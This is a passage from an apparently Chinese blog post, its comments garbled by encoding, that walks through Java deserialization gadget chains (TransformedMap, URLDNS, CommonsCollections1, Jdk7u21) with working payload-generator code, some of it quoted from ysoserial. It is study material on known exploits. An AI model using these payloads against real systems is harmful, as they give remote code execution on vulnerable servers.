class="title">Reverse_Payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// æ„é€  ChainedTransformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;open /Applications/Calculator.app&quot;</span> &#125;) &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€  Map</span></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innermap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ„é€  TransformedMap</span></span><br><span class="line">        Map outmap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// é€šè¿‡åå°„è·å¾— AnnotationInvocationHandler ç±»å¯¹è±¡</span></span><br><span class="line">        Class cls = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// é€šè¿‡åå°„è·å¾— cls çš„æ„é€ å‡½æ•°</span></span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// è®¾ç½® Accessible ä¸º true</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//é€šè¿‡ newInstance() æ–¹æ³•å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">        Object instance = ctor.newInstance(Retention.class, outmap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GeneratePayload(Reverse_Payload(), <span class="string">&quot;obj&quot;</span>);</span><br><span class="line">        payloadTest(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GeneratePayload</span><span class="params">(Object instance, String file)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// å°†æ„é€ å¥½çš„ payload åºåˆ—åŒ–åå†™å…¥æ–‡ä»¶ä¸­</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(file);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">payloadTest</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// è¯»å–å†™å…¥çš„ payload å¹¶è¿›è¡Œååºåˆ—åŒ–</span></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h1><div class="note primary flat"><p>å»ºè®®å°‡ <a href="https://github.com/frohoff/ysoserial">frohoff/ysoserial</a> å…‹éš†ä¸‹æ¥æœ¬åœ°è°ƒè¯•ï¼Œè¿™é‡Œä¹Ÿåªæ˜¯ç¿»æŸ¥äº†ä¸€ä¸‹åˆ©ç”¨é“¾è€Œå·²ã€‚</p></div><p>Java ååºåˆ—åŒ– RCE ä¸‰è¦ç´ ï¼šreadobject åˆ©ç”¨ç‚¹ã€åˆ©ç”¨é“¾ã€RCE è§¦å‘ç‚¹</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><blockquote><p>URL ç±»çš„å¯¹è±¡åœ¨æ¯”è¾ƒæ—¶ä¼šè¿›è¡Œ DNS æŸ¥è¯¢ï¼ŒHashMap ååºåˆ—åŒ–æ—¶ä¼šå¯¹ key è¿›è¡Œå“ˆå¸Œå’Œæ¯”è¾ƒ<br>å°† URL ç±»å¯¹è±¡ä½œä¸º HashMap çš„ keyï¼ŒåŒæ—¶å°†å…¶ url è®¾ç½®ä¸ºå¯ä»¥æŸ¥è¯¢ DNSLOG åœ°å€ï¼Œå°† HashMap å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œå½“æœåŠ¡å™¨ååºåˆ—è¯¥æ•°æ®æ—¶å°†è§¦å‘ DNS æŸ¥è¯¢ã€‚</p></blockquote><p>ä¸ä¾èµ–ä»»ä½•ç¬¬ä¸‰æ–¹åº“ï¼Œå¯ä»¥ç”¨äºç¡®è®¤ <code>readObject</code> ååºåˆ—åŒ–åˆ©ç”¨ç‚¹å­˜åœ¨</p><p>URL ç±»åœ¨æ¯”è¾ƒæ—¶ï¼ˆ<code>equals</code>ã€<code>hashCode</code>ï¼‰ä¼šè¿›è¡Œ DNS æŸ¥è¯¢ï¼Œå½“ä¸¤ä¸ªä¸»æœºåè§£æåˆ°åŒä¸€ä¸ª ip æ—¶è®¤ä¸ºå®ƒä»¬ç›¸ç­‰ã€‚</p><p>åˆ©ç”¨é“¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() <span class="comment"># k-v ç»“æ„</span></span><br><span class="line">  HashMap.putVal()   <span class="comment"># java.util.HashMap#readObject ååºåˆ—åŒ–ä¸­è°ƒç”¨ï¼Œå‚æ•°ä¸º hash(key)</span></span><br><span class="line">    HashMap.hash()   <span class="comment"># è®¡ç®— key çš„å“ˆå¸Œå€¼ï¼Œè°ƒç”¨ java.net.URL#hashCode</span></span><br><span class="line">      URL.hashCode() <span class="comment"># å½“ hashCode ä¸º -1 æ—¶ï¼Œè°ƒç”¨ java.net.URLStreamHandler#hashCodeï¼Œå†…éƒ¨å†è°ƒç”¨ getHostAddress </span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/TkyD5gURHJzx4lG.png" ><p>POC ç¤ºä¾‹</p><ul><li>å°† URL å¯¹è±¡ä½œä¸º HashMap çš„ keyï¼Œååºåˆ—åŒ–æ—¶è§¦å‘ DNS æŸ¥è¯¢</li><li>URL ç±»ä¼šç¼“å­˜ <code>hashCode</code> çš„æ‰§è¡Œç»“æœï¼Œå­˜å‚¨åœ¨ä¸€ä¸ªé transient çš„å®ä¾‹å˜é‡ä¸­ï¼Œåºåˆ—åŒ–æ—¶å†™å…¥<ul><li>å› æ­¤åœ¨æŠŠ URL æ·»åŠ åˆ° HashMap å‰è¦é‡ç½®ç¼“å­˜å€¼ï¼ˆåˆ©ç”¨åå°„ï¼‰</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 0x01.ç”Ÿæˆ payload</span></span><br><span class="line">        <span class="comment">// è®¾ç½®ä¸€ä¸ª hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è®¾ç½®å¯ä»¥æ¥æ”¶ DNS æŸ¥è¯¢çš„åœ°å€</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://analysis&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å°† URL çš„ hashCode å­—æ®µè®¾ç½®ä¸ºå…è®¸ä¿®æ”¹</span></span><br><span class="line">        Field f = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1. è®¾ç½® url çš„ hashCode å­—æ®µä¸º 0xdeadbeefï¼ˆéšæ„çš„å€¼ï¼‰</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>);  <span class="comment">// é»˜è®¤ä¸º -1 ä¼šè§¦å‘ DNS æŸ¥è¯¢ï¼Œå› æ­¤ä¿®æ”¹å hashMap.put ä¸­å°±ä¸è§¦å‘</span></span><br><span class="line">        <span class="comment">// 2. å°† url æ”¾å…¥ hashMap ä¸­ï¼Œå³è¾¹å‚æ•°éšä¾¿å†™</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;http://analysis&quot;</span>);</span><br><span class="line">        <span class="comment">// ä¿®æ”¹ url çš„ hashCode å­—æ®µä¸º -1ï¼Œè§¦å‘ DNS æŸ¥è¯¢</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 0x02.å†™å…¥æ–‡ä»¶æ¨¡æ‹Ÿç½‘ç»œä¼ è¾“</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 0x03.è¯»å–æ–‡ä»¶ï¼Œè¿›è¡Œååºåˆ—åŒ–è§¦å‘ payload</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.URLDNS ä½¿ç”¨ URL ç±»å¯¹è±¡å’Œ url å€¼ä½œä¸º HashMap å¯¹è±¡çš„ key-value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">        <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">        URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">        HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">        URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">        ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.URLDNS.SilentURLStreamHandler é¿å…åœ¨ç”Ÿæˆ payload æ—¶è§¦å‘ DNS æŸ¥è¯¢ï¼Œè¿”å›ä¸ºç©º</p><ul><li>è§„é¿ DNSLOG</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><blockquote><p>åˆ©ç”¨ ChainedTransformer æ„é€ æ¶æ„è°ƒç”¨é“¾<br>æ”¾åœ¨ç‰¹æ€§å’Œ TransformedMap ç›¸åŒçš„ lazyMap ä¸­<br>é€šè¿‡åŠ¨æ€ä»£ç† AnnotationInvocationHandler çš„ååºåˆ—åŒ–è§¦å‘</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>commons-collections 3.1 ~ 3.2.1</li><li>jdk1.8 ä¹‹å‰</li></ul><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/O45lTtijsKYwng6.jpg" ><p>ysoserial.payloads.CommonsCollections1 æ„é€  <code>ChainedTransformer</code>ï¼ˆRCE æŒ‡ä»¤ï¼‰ï¼Œç„¶åå°è£…åˆ° lazyMap ä¸­ã€‚åŠ¨æ€ä»£ç† AnnotationInvocationHandler ååºåˆ—åŒ–æ—¶ä¼šå¯¹æˆå‘˜å˜é‡ <code>memberValues</code> ï¼ˆä»£ç†å¯¹è±¡ï¼‰è°ƒç”¨ <code>entrySet</code> æ–¹æ³•ï¼Œå³è°ƒç”¨å¯¹åº” handler çš„ invoke æ–¹æ³•ï¼Œå› æ­¤ç”¨ lazyMap æ„é€ ä»£ç†ã€‚ç„¶åä¼šè°ƒç”¨ lazyMap çš„ handlerï¼Œä¹Ÿå³è°ƒç”¨èµ‹å€¼ç»™å…¶ <code>factory</code> æ–¹æ³•çš„ ChainedTransformerï¼Œå®ç° RCEã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line"><span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»º lazyMap å¯¹è±¡</span></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="comment">// transformerChain èµ‹å€¼ç»™ lazyMap çš„ factory å˜é‡</span></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠ¨æ€ä»£ç†</span></span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† Map ä¼ å…¥ InvocationHandler æˆå‘˜å˜é‡ memberValues</span></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ©ç”¨åå°„èµ‹å€¼</span></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="jdk-1-7u21"><a href="#jdk-1-7u21" class="headerlink" title="jdk 1.7u21"></a>jdk 1.7u21</h2><blockquote><p>æ¶‰åŠå“ˆå¸Œç¢°æ’å’Œ TemplatesImpl<br>TemplatesImpl æ‰¿è½½æ¶æ„è°ƒç”¨é“¾ï¼Œå¯ä½œä¸ºå…¶ä»– gadget çš„â€œååŠâ€éƒ¨åˆ†</p></blockquote><p>ä¸ä¾èµ–ç¬¬ä¸‰æ–¹åº“ï¼ŒJDK æœ¬èº«å®ç°çš„ååºåˆ—åŒ–æ“ä½œå­˜åœ¨å®‰å…¨æ¼æ´ã€‚</p><p>fixï¼šAnnotationInvocationHandler çš„ <code>readObject</code> æ–¹æ³•å¢åŠ äº†å¼‚å¸¸æŠ›å‡ºï¼Œä¹‹å‰æ˜¯ç›´æ¥ returnã€‚</p><ul><li>HashMap æ„é€ çš„ AnnotationInvocationHandler å’Œ TemplatesImpl å¯ä»¥å­˜å‚¨åœ¨ LinkedHashSet ä¸­ï¼Œåœ¨ååºåˆ—åŒ–æ—¶é€šè¿‡å“ˆå¸Œç¢°æ’ï¼ˆ<code>hashCode(f5a5a608)=0</code>ï¼‰æ‰§è¡Œä¸‹ä¸€æ­¥ï¼›</li><li>åœ¨ä»£ç†å¯¹è±¡ä¸Šè°ƒç”¨ <code>equals()</code>ï¼Œå³è°ƒç”¨ AnnotationInvocationHandler çš„ <code>equalsImpl()</code>ï¼Œå®ƒä¼š invoke TemplatesImpl çš„æ‰€æœ‰éé›¶å‚æ–¹æ³•ï¼ŒåŒ…æ‹¬ <code>getOutputProperties()</code>ï¼›</li><li>ä¸Šé¢çš„æ­¥éª¤ä¼šä½¿ç”¨ TemplatesImpl ä¸­åºåˆ—åŒ–çš„æ¶æ„å­—èŠ‚æ•°ç»„ <code>_bytecodes</code> ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨ <code>ClassLoader.declareClass()</code>ï¼Œæœ€ç»ˆå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</li></ul><p>ååºåˆ—åŒ–å¯¹è±¡å›¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet</span><br><span class="line">     |  |</span><br><span class="line">     |  &#96;--&gt; Proxy (Templates) </span><br><span class="line">     |         |</span><br><span class="line">     |         &#96;--&gt; AnnotationInvocationHandler </span><br><span class="line">     |                      |</span><br><span class="line">     |                      &#96;--&gt; HashMap</span><br><span class="line">     |                            |  |</span><br><span class="line">     |                            |  &#96;----&gt; String (&quot;f5a5a608&quot;)</span><br><span class="line">     |                            |</span><br><span class="line">     &#96;-----&gt; TemplatesImpl &lt;------&#96;</span><br><span class="line">                  |</span><br><span class="line">                  &#96;-------&gt; byte[] (malicious class definition)</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/oXL5farBdAERI1F.jpg" ><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (0)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.Jdk7u21</p><p>LinkedHashSet ï¼ˆç»§æ‰¿ HashMap å®ç°ï¼‰è°ƒç”¨ <code>writeObject()</code> æ–¹æ³•åºåˆ—åŒ–æ—¶ï¼Œä¼šä¾æ¬¡è°ƒç”¨æ¯ä¸ªå…ƒç´ çš„ <code>writeObject()</code> ï¼Œååºåˆ—åŒ–æ—¶ä¼šä¾æ¬¡è°ƒç”¨æ¯ä¸ªå…ƒç´ çš„ <code>readObject()</code> æ–¹æ³•ï¼Œç„¶åå°†å…¶ä½œä¸º key æ”¾å…¥ HashMap ä¸­ã€‚</p><p>HashMap ä¸­æ·»åŠ å…ƒç´ ä¼šè°ƒç”¨å·²æœ‰å…ƒç´ çš„ key ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨æ’å…¥å…ƒç´ çš„ <code>equals()</code> æ–¹æ³•è¿›è¡Œæ¯”è¾ƒã€‚å› æ­¤åªè¦è®©ååºåˆ—åŒ–æ—¶å…ˆæ·»åŠ ä»£ç†å¯¹è±¡ï¼Œå†æ·»åŠ æ¶æ„ä»£ç å®ä¾‹å³å¯ã€‚</p><p>æ™®é€šå¯¹è±¡è°ƒç”¨ <code>hashCode()</code> æ¯”è¾ƒï¼Œä»£ç†å¯¹è±¡ AnnotationInvocationHandler é€šè¿‡ invoke è°ƒç”¨ <code>hashCode</code> ï¼Œå†…éƒ¨è°ƒç”¨ <code>hashCodeImpl()</code>ï¼Œè€Œå…¶å¯¹ memberValues å¾ªç¯è°ƒç”¨ <code>memberValueHashCode()</code>ï¼Œå½“å…¶ä¸­çš„å¯¹è±¡ä¸æ˜¯æ•°ç»„æ—¶ï¼Œè¿”å› <code>hashCode</code>ã€‚</p><p>ä¸ºäº†è®© AnnotationInvocationHandler ä»£ç†çš„å¯¹è±¡çš„è¿”å›å€¼ä¸æ™®é€šå¯¹è±¡çš„è¿”å›å€¼ç›¸ç­‰ï¼Œè¿™å°±è¦æ±‚ memberValues  ä¸­åªæœ‰ä¸€ä¸ªå€¼ï¼Œå› 